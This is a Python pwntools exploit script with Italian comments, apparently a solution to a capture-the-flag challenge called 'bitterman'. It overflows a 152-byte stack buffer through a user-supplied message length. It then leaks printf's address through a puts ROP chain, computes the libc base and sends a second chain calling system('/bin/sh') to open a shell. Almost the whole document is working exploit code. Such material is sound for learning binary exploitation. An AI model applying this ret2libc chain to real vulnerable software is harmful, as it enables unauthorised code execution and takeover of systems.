


"""
Il codice e' quasi memory safe perche' usa una funzione chiamata read_nbytes
1) la prima cosa che chiede e' il nome e qui il numero di byte massimo e' gestito dal codice
2) chiede la lunghezza del messaggio all'utente (importante)
3) chiede all'utente di inserire il messaggio   (usando come numero di byte da leggere quello inserito dall'utente)
    se uso 500 e muso pattern create e pattern search vedo che l'offset per raggiungere rsp è 152

    

abbiamo nel codice printf e puts (guarda gdb disass main)

posso usarli per leakare la libc
"""

from pwn import *


buf = b'\x55'*152

context(arch='amd64', os='linux')
#p = gdb.debug('./bitterman', 'b main')
p = process('./bitterman')


# questa classe mi permette di manipolare il file ELF (il binario)
reference_to_binary_file = ELF('./bitterman')

#questo mi permette di creare la rop chain
rop_chain_to_leak_printf = ROP(reference_to_binary_file)


#flow to reach buffer overflow
p.recvuntil(b"> What\'s your name? \n")
p.sendline(b'hello')
p.recvuntil(b'> Please input the length of your message: \n')
p.sendline(b'10000')
p.recvuntil(b'> Please enter your text: \n')


#mi stampo e faccio la leak dell'indirizzo della printf
rop_chain_to_leak_printf.puts(reference_to_binary_file.got['printf'])

#rieseguo il main così posso eseguire nuovamente il buffer overflow
rop_chain_to_leak_printf.call(reference_to_binary_file.symbols['main'])

p.sendline(buf + rop_chain_to_leak_printf.chain())


p.recvuntil(b'> Thanks!\n')
leaked_printf = u64(p.recvline()[:-1].ljust(8,b'\x00'))


libc_file_reference= ELF("/lib/x86_64-linux-gnu/libc.so.6")

#prendo l'offset della printf 
libc_printf = libc_file_reference.symbols['printf']


#base address libc
libc_base_address = leaked_printf - libc_printf


#modifico l'indirizzo di base della libc per trovare le funzioni che mi servono
libc_file_reference.address = libc_base_address


rop_for_gain_shell=ROP(libc_file_reference)

#ret per allineare lo stack
ret_gadget = rop_for_gain_shell.find_gadget(['ret'])[0]


#next is used to read the content of the object returned
bin_sh_address = next(libc_file_reference.search(b'/bin/sh'))

#passo l'address di /bin/sh alla funzione system per eseguire la shell
rop_for_gain_shell.system(bin_sh_address)


log.info("chain to gain the shell:\n"+rop_for_gain_shell.dump())

payload = buf + p64(ret_gadget)+ rop_for_gain_shell.chain()

#normal flow to reach buffer overflow
p.recvuntil(b"> What\'s your name? \n")
p.sendline(b'hello')
p.recvuntil(b'> Please input the length of your message: \n')
p.sendline(b'10000')
p.recvuntil(b'> Please enter your text: \n')
p.sendline(payload)

#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()


